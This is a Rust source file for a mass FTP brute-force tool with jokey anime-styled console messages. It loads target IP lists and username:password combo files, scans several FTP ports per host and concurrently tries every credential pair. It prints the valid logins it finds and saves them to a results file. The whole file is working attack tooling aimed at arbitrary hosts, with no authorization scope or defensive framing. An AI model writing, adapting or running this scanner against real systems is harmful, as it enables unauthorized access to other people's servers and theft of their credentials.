use anyhow::{anyhow, Result};
use futures::{stream::Stream, StreamExt};
use suppaftp::AsyncFtpStream;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::Path,
    pin::Pin,
    sync::Arc,
    task::{Context, Poll},
};
use tokio::{
    sync::{Mutex, Semaphore},
    time::{sleep, timeout, Duration},
};
use futures::stream::FuturesUnordered;
// === Config ===
const MAX_PORT_SCAN_CONCURRENCY: usize = 5;
const PORTS: &[u16] = &[21, 990, 2121, 8021, 2221];
const TIMEOUT_SECS: u64 = 5;
const GLOBAL_CONCURRENCY: usize = 15;
const STOP_ON_SUCCESS: bool = true;
const SAVE_RESULTS: bool = true;
const OUTPUT_FILE: &str = "ftp_results.txt";

// Input files
const IP_LIST_FILE: &str = "ips.txt";
const USERPASS_FILE: &str = "combo.txt";

// === Colors ===
const PURPLE: &str = "\\x1b[38;5;135m";
const ORANGE: &str = "\\x1b[38;5;214m";
const PINK: &str = "\\x1b[38;5;213m";
const RESET: &str = "\\x1b[0m";

// === Helper Functions ===
fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader.lines().filter_map(Result::ok).collect())
}

fn format_addr(target: &str, port: u16) -> String {
    if target.starts_with('[') && target.contains("]:") {
        target.to_string()
    } else if target.matches(':').count() == 1 && !target.contains('[') {
        target.to_string()
    } else {
        let clean = if target.starts_with('[') && target.ends_with(']') {
            &target[1..target.len() - 1]
        } else {
            target
        };
        if clean.contains(':') {
            format!("[{}]:{}", clean, port)
        } else {
            format!("{}:{}", clean, port)
        }
    }
}

async fn quick_ftp_check(addr: &str) -> Result<bool> {
    match timeout(Duration::from_secs(TIMEOUT_SECS), AsyncFtpStream::connect(addr)).await {
        Ok(Ok(mut ftp)) => {
            let _ = ftp.quit().await;
            Ok(true)
        }
        Ok(Err(_)) | Err(_) => Ok(false),
    }
}

async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
    match AsyncFtpStream::connect(addr).await {
        Ok(mut ftp) => {
            match ftp.login(user, pass).await {
                Ok(_) => {
                    let _ = ftp.quit().await;
                    Ok(true)
                }
                Err(e) => {
                    let msg = e.to_string();
                    if msg.contains("530") {
                        Ok(false)
                    } else if msg.contains("421") {
                        sleep(Duration::from_secs(1)).await;
                        Ok(false)
                    } else {
                        Err(anyhow!("FTP error: {}", msg))
                    }
                }
            }
        }
        Err(e) => {
            println!("{ORANGE}[!] Connection error {} -> {}:{} => {}{RESET}", addr, user, pass, e);
            Ok(false)
        }
    }
}

// === Combo Stream (Cartesian product) ===
pub struct ComboStream {
    usernames: Arc<Vec<String>>,
    passwords: Arc<Vec<String>>,
    user_index: usize,
    pass_index: usize,
}

impl ComboStream {
    pub fn new(usernames: Arc<Vec<String>>, passwords: Arc<Vec<String>>) -> Self {
        Self {
            usernames,
            passwords,
            user_index: 0,
            pass_index: 0,
        }
    }
}

impl Stream for ComboStream {
    type Item = (String, String);

    fn poll_next(mut self: Pin<&mut Self>, _cx: &mut Context<'_>) -> Poll<Option<Self::Item>> {
        if self.user_index >= self.usernames.len() {
            return Poll::Ready(None);
        }

        if self.pass_index >= self.passwords.len() {
            self.user_index += 1;
            self.pass_index = 0;
        }

        if self.user_index >= self.usernames.len() {
            return Poll::Ready(None);
        }

        let user = self.usernames[self.user_index].clone();
        let pass = self.passwords[self.pass_index].clone();
        self.pass_index += 1;

        Poll::Ready(Some((user, pass)))
    }
}

// === Main Brute-force Logic ===
pub async fn run(_target: &str) -> Result<()> {
println!("{PURPLE}");
println!("(๑˃ᴗ˂)ﻭ ✧*:･ﾟ✧ W-Welcome to the ultimate Kawaii FTP Brute-forcer, Oni-chan~! ✧*:･ﾟ✧");
println!("(っ◔◡◔)っ ♥ Let's hunt those passwords with sparkle magic and friendship! ♥");
println!("~*+:｡.｡(๑´ꈊ`๑)｡.｡:+*~");
println!("{RESET}");

println!("{PINK}(つ≧▽≦)つ~ Initiating super-duper lovely scanning mode... Let's do our best!~ {RESET}");

    let combos = load_lines(USERPASS_FILE)?;
    let mut usernames_vec = Vec::new();
    let mut passwords_vec = Vec::new();

    for combo in combos {
        if let Some((user, pass)) = combo.split_once(':') {
            usernames_vec.push(user.to_string());
            passwords_vec.push(pass.to_string());
        } else {
            println!("{ORANGE}[!] Skipping invalid combo line: {combo}{RESET}");
        }
    }

    let usernames = Arc::new(usernames_vec);
    let passwords = Arc::new(passwords_vec);
    let found = Arc::new(Mutex::new(Vec::new()));
    let semaphore = Arc::new(Semaphore::new(GLOBAL_CONCURRENCY));
    let ips = load_lines(IP_LIST_FILE)?;

    let mut all_tasks: FuturesUnordered<tokio::task::JoinHandle<Result<()>>> = FuturesUnordered::new();

let ip_task_semaphore = Arc::new(Semaphore::new(200)); // limit to 500 IPs at once

for ip in ips {
    let ip = ip.trim().to_string();
    if ip.is_empty() {
        continue;
    }

    let usernames = Arc::clone(&usernames);
    let passwords = Arc::clone(&passwords);
    let found = Arc::clone(&found);
    let semaphore = Arc::clone(&semaphore);
    let ip_task_semaphore = Arc::clone(&ip_task_semaphore);

    let permit = ip_task_semaphore.acquire_owned().await.unwrap();

    all_tasks.push(tokio::spawn(async move {
        let _ip_task_guard = permit; // keeps the permit alive until the task ends

        let mut open_ports = Vec::new();
        let port_scan_sem = Arc::new(Semaphore::new(MAX_PORT_SCAN_CONCURRENCY));
        let mut scan_tasks = futures::stream::FuturesUnordered::new();

        for &port in PORTS {
            let addr = format_addr(&ip, port);
            let port_scan_sem = Arc::clone(&port_scan_sem);
            scan_tasks.push(tokio::spawn(async move {
                let _permit = port_scan_sem.acquire_owned().await.unwrap();
                if quick_ftp_check(&addr).await.unwrap_or(false) {
                    Some(port)
                } else {
                    None
                }
            }));
        }

        while let Some(res) = scan_tasks.next().await {
            if let Ok(Some(port)) = res {
                open_ports.push(port);
            }
        }

            if open_ports.is_empty() {
                return Ok(());
            }

            println!("{PINK}(๑˃̵ᴗ˂̵)و {}: Ports OPEN desuuu~!! {:?} Time to show our power! 💪🌸{RESET}", ip, open_ports);

            for port in open_ports {
                let addr = format_addr(&ip, port);
                println!("{PURPLE}(=✪ᆺ✪=) Brute-forcing {} nya~! Ganbatte! (ง •̀_•́)ง{RESET}", addr);


                let successes = Arc::new(Mutex::new(Vec::new()));
                let stop_flag = Arc::new(Mutex::new(false));
                let combo_stream = ComboStream::new(usernames.clone(), passwords.clone());

                combo_stream
                    .for_each_concurrent(GLOBAL_CONCURRENCY, |(user, pass)| {
                        let addr = addr.clone();
                        let successes = Arc::clone(&successes);
                        let stop_flag = Arc::clone(&stop_flag);
                        let semaphore = Arc::clone(&semaphore);

                        async move {
                            let _permit = semaphore.acquire_owned().await.unwrap();

                            if STOP_ON_SUCCESS && *stop_flag.lock().await {
                                return;
                            }

                            match try_ftp_login(&addr, &user, &pass).await {
                                Ok(true) => {
                                    println!("{PINK}[+] Sugoiii! {} -> {}:{} 💖{RESET}", addr, user, pass);
                                    successes.lock().await.push((addr.clone(), user.clone(), pass.clone()));
                                    if STOP_ON_SUCCESS {
                                        *stop_flag.lock().await = true;
                                    }
                                }
                                Ok(false) => {
                                    println!("{ORANGE}(〒︿〒) Aww... Nope: {} -> {}:{} But we won't give up! {RESET}", addr, user, pass);

                                }
                                Err(e) => {
                                    println!("{ORANGE}[!] eww you perve onichan Connection Error: {} -> {}:{} => {}{RESET}", addr, user, pass, e);
                                }
                            }
                        }
                    })
                    .await;

                let results = successes.lock().await;
                if !results.is_empty() {
                    found.lock().await.extend(results.iter().cloned());
                } else {
                    println!("{ORANGE}[!] {}: No valid credentials... (つω`｡){RESET}", addr);
                }
            }

            Ok(())
        }));
    }

    while let Some(res) = all_tasks.next().await {
        res??;
    }

    let creds = found.lock().await;

    if creds.is_empty() {
        println!("\n{ORANGE}(｡•́︿•̀｡) No passwords found... Oni-chan, we have failed... But we'll come back stronger!!{RESET}");
    } else {
        println!("\n{PINK}╰(°▽°)╯ Yattaaa~! Valid credentials found, yattaaa!!! (ﾉ◕ヮ◕)ﾉ*:💖💖💖･ﾟ✧{RESET}");

        for (host, user, pass) in creds.iter() {
            println!("{PINK}    {} -> {}:{} {RESET}", host, user, pass);
        }

        if SAVE_RESULTS {
            let mut file = File::create(OUTPUT_FILE)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            println!("{PINK}(＾▽＾) Results saved to '{}' ~ Nyaa! Let's brag to Senpai!{RESET}", OUTPUT_FILE);
        }
    }

    Ok(())
}

// === Entry Point ===
#[tokio::main]
async fn main() -> Result<()> {
    run("").await
}
